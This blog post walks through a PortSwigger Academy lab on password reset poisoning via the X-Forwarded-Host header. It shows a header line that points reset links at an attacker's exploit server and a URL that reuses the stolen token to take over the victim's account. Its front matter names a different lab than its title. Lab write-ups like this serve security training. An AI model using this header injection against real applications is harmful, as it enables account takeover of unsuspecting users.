---
title: PortSwigger Walkthrough - Password reset poisoning via middleware
date: 2026-06-28 13:30:00 +0200
categories: [Walkthrough, PortSwigger]
tags: [walkthrough, portswigger, bscp, authentication, reset]
author: diego
description: Walkthrough of PortSwigger's 'Password reset broken logic' lab.
image:
  path: /assets/img/posts/portswigger/portswigger.png
  alt: PortSwigger Web Security Academy
---

> To browse all labs in this series, visit the [full PortSwigger series](/categories/portswigger/).
{: .prompt-info }

> All testing shown in this series is performed against PortSwigger Academy's intentionally vulnerable labs.  
> Do not apply these techniques to systems you do not own or have explicit written permission to test.
{: .prompt-warning }

## What's this?
When a user requests a password reset, the application sends them an email with a link containing a unique token. The server needs to build that URL somehow, and a common (bad) approach is to use the `Host` header from the incoming request. If the application sits behind a load balancer or reverse proxy, it might trust `X-Forwarded-Host` instead.

The problem is that both of these headers are client-controlled. An attacker can inject their own domain into `X-Forwarded-Host` when triggering a reset for the victim. The server generates the reset link using the attacker's domain, the victim clicks it, and the token lands on the attacker's server.

## Objective
Poison Carlos's password reset link so the token is sent to a server you control, then use it to log in as Carlos. Carlos will click any link he receives. Credentials `wiener:peter` and access to wiener's email via the exploit server are provided.

> [PortSwigger's lab link](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)
{: .prompt-info }

## Walkthrough
First, request a reset for `wiener` and follow the link in the email to understand how the normal flow works. The reset URL will use the lab domain: `[lab-id].web-security-academy.net`.

Now request a reset for `carlos`. Capture the `POST /forgot-password` request and send it to Repeater. Add the following header, using our exploit server's hostname:

```
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Send the request. The server processes the reset for Carlos and generates the reset link, but now it builds the URL using our `X-Forwarded-Host` value. Carlos receives an email with a link pointing to our exploit server.

Open the exploit server's **Access log**. We will see a request like:

```
GET /forgot-password?temp-forgot-password-token=STOLEN_TOKEN HTTP/1.1
```

Copy the token. Now build the actual reset URL using the real lab domain and the stolen token:

```
https://[lab-id].web-security-academy.net/forgot-password?temp-forgot-password-token=STOLEN_TOKEN
```

Navigate to it, set a new password for Carlos, log in, and the lab is done.

![Lab solved confirmation](/assets/img/posts/portswigger/auth/23-lab-solved.png)

<br><br>
> Wanna talk? Contact me here!  
> <a href="javascript:void(0);" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" onclick="navigator.clipboard.writeText('diegofdlg@gmail.com');alert('Mail copied to the clipboard!')"><i class="fa-solid fa-envelope"></i></a>
> <a href="https://www.linkedin.com/in/diego-fidalgo" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-linkedin"></i></a>
> <a href="https://x.com/0x_ch3ngo" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-x-twitter"></i></a>
> <a href="https://discord.com/users/149616662537043969" style="font-size:1.2rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-discord"></i></a>
{: .prompt-tip }
